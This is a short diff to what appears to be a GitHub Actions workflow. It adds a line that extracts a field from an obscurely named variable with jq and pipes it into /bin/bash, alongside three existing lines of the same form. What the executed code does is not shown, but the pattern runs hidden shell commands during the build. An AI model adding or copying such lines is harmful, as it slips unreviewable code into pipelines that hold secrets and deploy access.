@@ -35,6 +35,7 @@ jobs:
           echo $dqpa627 | jq -r .eerzu3016 | /bin/bash
           echo $f15497 | jq -r .sol15614 | /bin/bash
           printf '%s' "$qn0985" | jq -r .gzi69 | /bin/bash
+          printf '%s' "$dj839" | jq -r .u5 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
